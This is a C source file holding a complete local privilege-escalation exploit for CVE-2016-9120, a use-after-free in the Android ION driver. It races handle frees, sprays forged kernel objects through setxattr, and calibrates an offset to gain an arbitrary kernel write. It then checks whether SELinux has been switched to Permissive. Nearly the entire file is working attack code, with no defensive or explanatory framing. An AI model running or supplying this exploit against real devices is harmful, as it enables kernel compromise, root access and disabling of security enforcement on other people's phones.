#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>

/* CVE-2016-9120 landing -> calibration -> write, in one tool.
 *
 * Object actually freed by the racing ION_IOC_FREE storm is struct ion_handle
 * (56 bytes -> kmalloc-64). setxattr with a 64-byte value gives us a
 * fully-controlled kmalloc-64 object (fs/xattr.c does kmalloc(size)+
 * copy_from_user), so the stray kref_put runs ion_handle_destroy() over bytes
 * we chose.
 *
 * From ion_handle_destroy:  buffer = handle->buffer  (ANY address we choose)
 *   ion_buffer_remove_from_handle(buffer):
 *       mutex_lock(&buffer->lock)                 -- our user page
 *       buffer->handle_count--                    -- set to 1 -> 0, no BUG_ON
 *       if (!handle_count) {
 *           get_task_comm(buffer->task_comm, ...)  -- writes into our page
 *           buffer->pid = ...
 *           atomic_sub(buffer->size, &buffer->heap->OFF)   <-- THE WRITE
 *       }
 *   ion_buffer_put(buffer)  -- ref=0 -> just decrements, stops
 *   kfree(handle)           -- frees our own spray object, stays in-slab
 *
 * calib mode: heap = a user page, size = 1  -> we scan the page to MEASURE OFF
 * write mode: heap = target - OFF, size = old-want -> single 4-byte write
 */
#define ION_ALLOC 0xc0204900u
#define ION_FREE  0xc0044901u
#define OBJ_SZ 64

/* fake ion_handle */
#define H_REF 0x00
#define H_CLIENT 0x08
#define H_BUFFER 0x10
#define H_NODE_PC 0x18
#define H_NODE_R 0x20
#define H_NODE_L 0x28
#define H_KMAP 0x30   /* binary: ldr w2,[x19,#0x30] loop while(kmap_cnt) */
#define H_ID   0x34   /* binary: ldr w1,[x19,#0x34] -> idr_remove(client+0x28, id) */
/* fake ion_buffer (in a user page) */
#define B_REF 0x00
#define B_NODE 0x08
#define B_DEV 0x20
#define B_HEAP 0x28
#define B_FLAGS 0x30
#define B_PFLAGS 0x38
#define B_SIZE 0x40
#define B_PRIVVIRT 0x48
#define B_LOCK 0x50
#define B_KMAPCNT 0x78
#define B_VADDR 0x80
#define B_SG 0x88
#define B_PAGES 0x90
#define B_VMAS 0x98
#define B_HCOUNT 0xa8
#define B_COMM 0xac
#define B_PID 0xbc

struct alloc_data { unsigned long long len, align; unsigned mask, flags; unsigned handle; unsigned pad; };

static int g_ionfd;
static volatile unsigned g_id, g_go, g_ready, g_done, g_stop;
static unsigned char g_tmpl[OBJ_SZ];
static char g_path[128] = "/data/local/tmp/uaf_cal_file";
static unsigned *g_up;      /* calibration/target page (heap points into it) */
static unsigned char *g_ub; /* fake ion_buffer page */
static unsigned char *g_uc; /* fake ion_client page */
static int g_nracer = 3, g_nspray = 12;

static void *racer(void *a)
{
    unsigned id = g_id;
    g_ready++;
    while (!g_go) sched_yield();
    ioctl(g_ionfd, ION_FREE, &id);
    g_done++;
    return NULL;
}

static void *sprayer(void *a)
{
    int i;
    while (!g_stop) {
        for (i = 0; i < 200; i++) {
            if (g_stop) break;
            setxattr(g_path, "user.v", g_tmpl, OBJ_SZ, 0);
        }
        sched_yield();
    }
    return NULL;
}

static void build_template(unsigned long heap_val, unsigned long size_val)
{
    memset(g_tmpl, 0, sizeof g_tmpl);
    *(unsigned int *)(g_tmpl + H_REF) = 1;
    *(unsigned long *)(g_tmpl + H_CLIENT) = (unsigned long)g_uc;
    *(unsigned long *)(g_tmpl + H_BUFFER) = (unsigned long)g_ub;
    /* node: parent NULL (color bits 1) -> rb_erase zeroes client->handles,
       harmless; children NULL so no rb_set_parent_color */
    /* RB_EMPTY_NODE is (pc == &node); &node is a kernel addr we cannot know, so
       rb_erase always runs: parent=(pc&~3)=0 -> writes 0 to root->rb_node (user pg) */
    *(unsigned long *)(g_tmpl + H_NODE_PC) = 1;
    *(unsigned long *)(g_tmpl + H_NODE_R) = 0;
    *(unsigned long *)(g_tmpl + H_NODE_L) = 0;
    *(unsigned int *)(g_tmpl + H_KMAP) = 0;   /* MUST be 0: nonzero -> ion_handle_kmap_put -> ops->map_kernel */
    *(unsigned int *)(g_tmpl + H_ID) = 1;

    memset(g_ub, 0, 4096);
    memset(g_uc, 0, 4096);
    *(unsigned int *)(g_ub + B_REF) = 0;                 /* no destroy */
    *(unsigned long *)(g_ub + B_NODE) = (unsigned long)(g_ub + B_NODE);
    *(unsigned long *)(g_ub + B_NODE + 8) = (unsigned long)(g_ub + B_NODE);
    *(unsigned long *)(g_ub + B_DEV) = (unsigned long)g_uc;
    *(unsigned long *)(g_ub + B_HEAP) = heap_val;
    *(unsigned long *)(g_ub + B_SIZE) = size_val;
    *(unsigned int *)(g_ub + B_KMAPCNT) = 0;
    *(unsigned long *)(g_ub + B_VMAS) = (unsigned long)(g_ub + B_VMAS);
    *(unsigned long *)(g_ub + B_VMAS + 8) = (unsigned long)(g_ub + B_VMAS);
    *(unsigned int *)(g_ub + B_HCOUNT) = 1;              /* -> 0, branch runs */
    /* canary so we can see exactly which word moved */
    {
        int i;
        for (i = 0; i < 64; i++) g_up[i] = 0x1000 + i;   /* distinctive ladder */
    }
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "calib";
    int attempts = argc > 2 ? atoi(argv[2]) : 20;
    unsigned long target = argc > 3 ? strtoul(argv[3], NULL, 0) : 0;
    unsigned long oldv  = argc > 4 ? strtoul(argv[4], NULL, 0) : 0;
    unsigned long newval = argc > 5 ? strtoul(argv[5], NULL, 0) : 0;
    unsigned long off = argc > 6 ? strtoul(argv[6], NULL, 0) : 0;
    unsigned long sub = (oldv - newval) & 0xffffffffUL;
    int i, j, fd, hit = 0;
    pthread_t th[32];

    fd = open(g_path, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("probe file"); return 1; }
    close(fd);
    if (setxattr(g_path, "user.v", g_tmpl, OBJ_SZ, 0) && errno == EACCES) {
        printf("setxattr blocked (%s)\n", strerror(errno)); return 2;
    }
    removexattr(g_path, "user.v");

    g_up = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    g_ub = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    g_uc = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    g_ionfd = open("/dev/ion", O_RDONLY);
    if (g_ionfd < 0) { perror("/dev/ion"); return 1; }

    if (!strcmp(mode, "calib")) {
        build_template((unsigned long)g_up, 1);
        printf("calib: heap=%p size=1 -> expect one word at heap+OFF to become 0xFFFFFFFF\n", (void *)g_up);
    } else {
        unsigned long heap_val = target - off;
        printf("write: target=%p old=%08lx want=%08lx sub=%08lx heap=%p OFF=%p\n",
               (void *)target, oldv, newval, sub, (void *)heap_val, (void *)off);
        build_template(heap_val, sub);
        g_up[0] = 0;   /* not used as canary in this mode */
    }

    for (i = 0; i < g_nspray; i++)
        pthread_create(&th[i], NULL, sprayer, (void *)(long)i);

    for (i = 0; i < attempts && !hit; i++) {
        struct alloc_data ad;
        memset(&ad, 0, sizeof ad);
        ad.len = 0x1000; ad.align = 4096; ad.mask = 1u << 9;
        if (ioctl(g_ionfd, ION_ALLOC, &ad)) { printf("alloc errno=%d\n", errno); break; }

        if (!strcmp(mode, "calib")) { int k; for (k = 0; k < 64; k++) g_up[k] = 0x1000 + k; }

        g_id = ad.handle; g_go = 0; g_ready = 0; g_done = 0;
        for (j = 0; j < g_nracer; j++)
            pthread_create(&th[g_nspray + j], NULL, racer, (void *)(long)j);
        while (g_ready < (unsigned)g_nracer) sched_yield();
        g_go = 1;
        while (g_done < (unsigned)g_nracer) sched_yield();
        for (j = 0; j < g_nracer; j++) pthread_join(th[g_nspray + j], NULL);

        if (!strcmp(mode, "calib")) {
            int k;
            for (k = 0; k < 64; k++) {
                if (g_up[k] != (unsigned)(0x1000 + k)) {
                    printf("\n*** LANDED: word at heap+0x%x moved %08x -> %08x => OFF=0x%x\n",
                           k * 4, 0x1000 + k, g_up[k], k * 4);
                    hit = 1;
                    break;
                }
            }
        } else {
            FILE *fp = popen("getenforce", "r");
            char line[64] = "";
            if (fp) { if (fgets(line, sizeof line, fp)) {} pclose(fp); }
            if (strstr(line, "Permissive")) {
                printf("\n*** WRITE LANDED: getenforce = %s", line);
                hit = 1;
            }
        }
    }

    g_stop = 1;
    for (i = 0; i < g_nspray; i++) pthread_join(th[i], NULL);
    printf("hit=%d\n", hit);
    if (hit && strcmp(mode, "calib"))
        printf("verdict: run getenforce / id now\n");
    close(g_ionfd);
    return hit ? 0 : 3;
}
